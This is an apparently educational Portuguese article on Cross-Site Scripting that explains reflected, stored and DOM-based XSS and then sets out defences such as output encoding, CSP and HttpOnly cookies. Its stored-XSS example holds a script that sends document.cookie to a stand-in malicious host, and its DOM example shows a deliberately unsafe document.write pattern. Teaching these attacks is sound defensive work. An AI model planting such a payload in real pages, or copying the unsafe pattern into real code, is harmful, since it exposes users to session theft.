# Cross-Site Scripting (XSS): Entendendo e Prevenindo

## O que é Cross-Site Scripting (XSS)?

Cross-Site Scripting (XSS) é uma vulnerabilidade de segurança que permite a atacantes injetar scripts maliciosos (geralmente JavaScript) em páginas web visualizadas por outros usuários. Quando um usuário acessa uma página comprometida, o navegador executa o script malicioso, que pode roubar cookies de sessão, redirecionar o usuário para sites maliciosos, realizar ações em nome do usuário ou até mesmo reescrever o conteúdo da página.

## Como funciona o ataque?

Existem três tipos principais de ataques XSS:

### 1. XSS Refletido (Non-Persistent XSS)

O script malicioso é "refletido" de volta para o usuário a partir de uma requisição HTTP. O atacante envia um link malicioso para a vítima, e quando a vítima clica no link, o script é executado no navegador dela. O script não é armazenado no servidor.

**Exemplo:**

Um site de busca vulnerável que exibe o termo de busca diretamente na página:

`https://exemplo.com/busca?q=<script>alert('XSS');</script>`

Se o site não sanitizar a entrada `q`, o script `alert('XSS');` será executado no navegador do usuário.

### 2. XSS Armazenado (Persistent XSS)

O script malicioso é permanentemente armazenado no servidor da aplicação (por exemplo, em um banco de dados, fórum, comentários de blog). Quando outros usuários acessam a página que contém o script armazenado, ele é recuperado do servidor e executado em seus navegadores. Este é o tipo mais perigoso de XSS, pois não requer interação direta da vítima com um link malicioso.

**Exemplo:**

Um atacante posta um comentário em um blog com o seguinte conteúdo:

```html
<script>document.location='http://site-malicioso.com/roubar_cookies.php?cookie=' + document.cookie;</script>
```

Quando outros usuários visualizam o comentário, o script é executado e seus cookies de sessão são enviados para o site malicioso.

### 3. XSS Baseado em DOM (DOM-based XSS)

O ataque ocorre inteiramente no lado do cliente, manipulando o DOM (Document Object Model) da página. O script malicioso não é enviado ao servidor. A vulnerabilidade reside no código JavaScript do lado do cliente que manipula dados controlados pelo atacante de forma insegura.

**Exemplo:**

Um script JavaScript que lê um parâmetro da URL e o insere diretamente no DOM:

```javascript
<script>
  var lang = location.hash.substring(1);
  document.write('Bem-vindo, ' + lang);
</script>
```

Se a URL for `https://exemplo.com/#<script>alert('XSS');</script>`, o script será executado.

## Como proteger sua aplicação?

### 1. Sanitização de Entrada

Nunca confie na entrada do usuário. Valide e sanitize todos os dados de entrada antes de processá-los ou exibi-los. Isso significa remover ou escapar caracteres especiais que podem ser interpretados como código executável.

*   **HTML Encoding:** Converta caracteres como `<`, `>`, `&`, `"`, `'` para suas entidades HTML correspondentes (`&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;`). Isso garante que o navegador interprete esses caracteres como texto e não como tags HTML ou código JavaScript.
*   **Bibliotecas de Sanitização:** Utilize bibliotecas de sanitização de HTML seguras e bem testadas para remover tags e atributos perigosos de conteúdo gerado pelo usuário. Exemplos incluem OWASP ESAPI, DOMPurify (para JavaScript no cliente) ou bibliotecas específicas para sua linguagem de programação/framework.

### 2. Contextual Output Encoding

O tipo de encoding (codificação) deve ser aplicado com base no contexto onde os dados serão exibidos. Por exemplo:

*   **HTML Context:** Use HTML entity encoding.
*   **JavaScript Context:** Use JavaScript string literal encoding (escapar aspas, barras invertidas, etc.).
*   **URL Context:** Use URL encoding.

### 3. Content Security Policy (CSP)

Uma Content Security Policy (CSP) é uma camada adicional de segurança que ajuda a mitigar ataques XSS. Ela permite que você especifique quais fontes de conteúdo (scripts, folhas de estilo, imagens, etc.) são permitidas para serem carregadas e executadas em sua página web. Isso pode impedir que scripts maliciosos injetados sejam executados, mesmo que uma vulnerabilidade XSS exista.

### 4. HttpOnly Flag para Cookies

Defina o atributo `HttpOnly` para cookies de sessão. Isso impede que scripts do lado do cliente (incluindo scripts XSS) acessem esses cookies. Se um atacante conseguir injetar um script, ele não conseguirá roubar o cookie de sessão do usuário, mitigando o impacto de um ataque de roubo de sessão.

### 5. Validação de Entrada no Lado do Servidor

Sempre realize a validação de entrada no lado do servidor, mesmo que você também a faça no lado do cliente. A validação do lado do cliente pode ser facilmente contornada por um atacante.

## Conclusão

XSS é uma vulnerabilidade persistente e perigosa. A chave para a proteção é tratar toda a entrada do usuário como não confiável e aplicar a sanitização e codificação de saída apropriadas para o contexto. A implementação de uma Content Security Policy e o uso da flag HttpOnly para cookies são medidas adicionais importantes para fortalecer a segurança da sua aplicação.

